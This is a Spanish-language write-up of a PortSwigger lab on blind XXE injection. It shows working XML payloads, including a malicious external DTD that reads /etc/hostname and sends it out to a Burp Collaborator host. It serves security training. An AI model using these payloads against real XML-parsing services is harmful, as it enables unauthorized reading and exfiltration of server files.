---
title: XXE Injection Lab 5
date: 2024-11-27 12:26:00 +0800
author: Justice-Reaper
categories:
  - Portswigger
  - XXE Injection
tags:
  - XXE
  - Injection
  - Exploiting
  - XXE
  - to
  - perform
  - SSRF
  - attacks
image:
  path: /assets/img/XXE-Injection-Lab-2/Portswigger.png
---

## Skills

- Exploiting blind XXE to exfiltrate data using a malicious external DTD

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este laboratorio tiene una función de `Check stock` que analiza `entradas XML`, pero `no muestra el resultado`. Para resolver el laboratorio, hay que extraer el contenido del archivo `/etc/hostname`

---
## Web Enumeration

Al `acceder` a la `web` nos sale esto

![[image_1.png]]

Si pulsamos en `View details` veremos la `descripción` del `artículo`

![[image_2.png]]

Si pulsamos en `Check stock` y `capturamos` la `petición` con `Burpsuite` vemos que se está tramitando un `XML`

![[image_3.png]]

`Enviamos` una `petición` con un `DTD (Document Type Definition)` y a `comprobar` si es `vulnerable` a `XXE` pero no vemos nada interesante en la `respuesta`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe "Doe"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Nos vamos a `Burpsuite Collaborator` y pulsamos en `Copy to clipboard`, este `dominio` obtenido lo vamos a usar para construir este `payload`, el `%` sirve para `llamar` a la `entidad` desde el `DTD` creado

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m.oastify.com"> %xxe; ]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Nos vamos a `Burpsuite Collaborator` y observamos que hemos `obtenido respuesta`, lo cual quiere decir que ya tenemos un `XXE out-of-band interaction`

![[image_4.png]]

Lo que podemos hacer ahora que hemos confirmado que podemos `cargar` un `recurso` del `servidor externo` es pulsar en `Go to exploit server`, introducir este `payload` en la parte de `Body` y pulsar sobre `Store` para almacenarlo. Esto `&#x25` es `%` pero en `hexadecimal`, se debe poner así y no en el formato normal para que funcione correctamente

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m?content=%file;'>">
%eval;
%exfil;
```

Lo siguiente que debemos hacer es irnos a donde pone `Craft response`, copiar la url `https://exploit-0aa200cb045beea1d8e97fad01f20055.exploit-server.net/exploit` y `enviar` la `petición`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0aa200cb045beea1d8e97fad01f20055.exploit-server.net/exploit"> %xxe; ]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Ahora nos vamos a `Burpsuite Collaborator`, pulsamos en `Resquest to Collaborator` y vemos el `/etc/hostname `

![[image_5.png]]

`Submiteamos` la `solución` y `completamos` el `laboratorio`

![[image_6.png]]
